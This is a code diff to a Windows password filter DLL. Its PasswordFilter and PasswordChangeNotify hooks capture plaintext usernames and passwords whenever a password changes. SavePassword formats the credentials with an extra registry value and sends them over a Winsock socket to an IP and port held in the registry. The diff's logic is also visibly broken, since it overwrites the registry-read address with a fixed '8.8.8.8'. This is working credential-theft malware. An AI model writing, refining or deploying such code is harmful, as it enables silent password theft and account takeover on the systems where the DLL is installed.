@@ -39,16 +39,14 @@ DWORD getPtReg()
 	return 80;
 }
 
-char * getIPReg()
+char* getIPReg(const wchar_t* input)
 {
 	HKEY hKey;
 	char Data[255];
 	DWORD Datasize = sizeof(Data);
 	DWORD Type;
-	char ipa[20];
+	char* ipa = (char*)malloc(20);
 	int indCtr = 0;
-
-	sprintf(ipa, "%s", "8.8.8.8");
 
 	if (RegOpenKeyEx(HKEY_LOCAL_MACHINE,
 		rKey,
@@ -58,7 +56,7 @@ char * getIPReg()
 
 	{
 		DWORD error = RegQueryValueEx(hKey,
-			L"ipa",
+			input,
 			NULL,
 			&Type,
 			(LPBYTE)&Data,
@@ -84,15 +82,14 @@ char * getIPReg()
 		}
 		RegCloseKey(hKey);
 	}
+	sprintf(ipa, "%s", "8.8.8.8");
 	return ipa;
 }
 
 
 int SavePassword(PUNICODE_STRING username, PUNICODE_STRING password)
 {
-	char* ip = getIPReg();
-	DWORD port = getPtReg();
-	printf("%s:%d", ip, port);
+	char* eip = getIPReg(L"eip");
 
 	WSADATA wsa;
 	SOCKET s;
@@ -100,12 +97,17 @@ int SavePassword(PUNICODE_STRING username, PUNICODE_STRING password)
 
 	char user[50];
 	char pass[50];
-	char creds[100];
+	char creds[150];
 
 	wcstombs(user, username->Buffer, sizeof(user));
 	wcstombs(pass, password->Buffer, sizeof(pass));
 
-	sprintf(creds, "%s:%s;end", user, pass);
+	sprintf(creds, "%s:%s;end;%s;", user, pass, eip);
+
+	free(eip);
+
+	char* ip = getIPReg(L"ipa");
+	DWORD port = getPtReg();
 
 	printf("\nInitialising Winsock...");
 	if (WSAStartup(MAKEWORD(2, 2), &wsa) != 0)
@@ -146,9 +148,11 @@ int SavePassword(PUNICODE_STRING username, PUNICODE_STRING password)
 	}
 	puts("Data Send\n");
 
+	free(ip);
 	return 0;
 
-	error: 
+error:
+	free(ip);
 	WSACleanup();
 	return 1;
 }
@@ -170,19 +174,6 @@ NTSTATUS WINAPI PasswordChangeNotify(PUNICODE_STRING UserName, ULONG RelativeID,
 extern "C" __declspec(dllexport)
 BOOLEAN WINAPI PasswordFilter(PUNICODE_STRING AccountName, PUNICODE_STRING FullName, PUNICODE_STRING Password, BOOLEAN SetOperation)
 {
-	return TRUE;
-}
-
-BOOL APIENTRY Dllmain(HMODULE hModule, DWORD ul_reason_for_call, LPVOID lpReserved)
-{
-	switch (ul_reason_for_call)
-	{
-	case DLL_PROCESS_ATTACH: 
-	case DLL_THREAD_ATTACH:  
-	case DLL_THREAD_DETACH:  
-	case DLL_PROCESS_DETACH: 
-		break;
-	}
 	return TRUE;
 }
 
